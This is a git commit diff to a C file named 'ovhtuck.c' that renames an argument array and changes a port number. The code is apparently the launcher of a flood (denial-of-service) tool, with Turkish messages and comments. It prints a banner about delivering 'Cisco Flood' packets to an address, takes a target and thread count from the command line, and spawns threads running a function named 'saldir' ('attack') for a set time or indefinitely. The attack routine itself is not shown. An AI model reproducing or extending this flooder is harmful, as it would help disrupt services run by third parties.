7026bcbdf5ee3062107476235042328aa6052620
rodri0001 <95370588+rodri0001@users.noreply.github.com>
2022-12-04 12:16:56 +0300

    Update ovhtuck.c

--- ovhtuck.c
+++ ovhtuck.c
@@ -1,8 +1,8 @@
-int bypasslakocum(int kontrol, char *durum[ ])
+int bypasslakocum(int kontrol, char *durumcuuuk[ ])
 {
         if(kontrol < 4){
         	    fprintf(stdout, "Cisco Flood Srx 3600 Paketi Kargo Gibi Adrese Teslim Eder :) ...\n");
-                fprintf(stderr, "Rodriquez....\n", durum[0]);
+                fprintf(stderr, "Rodriquez....\n", durumcuuuk[0]);
                 exit(-1);
         }
 
@@ -14,18 +14,18 @@ int bypasslakocum(int kontrol, char *durum[ ])
         int max_paket = 128;
         char *veri = (char *) malloc(max_paket);
         veri = memset(veri, 0x00, max_paket);
-        int islemcimiktari = atoi(durum[3]);
+        int islemcimiktari = atoi(durumcuuuk[3]);
         pthread_t cekirdek[islemcimiktari];
         struct cekirdek_verisi td[islemcimiktari];
-		portumuz = 9987;
+		portumuz = 9980;
         for(i = 0;i<islemcimiktari;i++){
-                pthread_create( &cekirdek[i], NULL, &saldir, (void *) durum[1]);
+                pthread_create( &cekirdek[i], NULL, &saldir, (void *) durumcuuuk[1]);
         }
         fprintf(stdout, "İstanbul Sabiha Gökcen Havalimani İyi Uçuşlar Diler Adamimmm....\n");
         fprintf(stdout, "Coded Rodriquez... \n");
         if(kontrol > 4)
         {
-                sleep(atoi(durum[4]));
+                sleep(atoi(durumcuuuk[4]));
         } else {
                 while(1){
                         sleep(1);
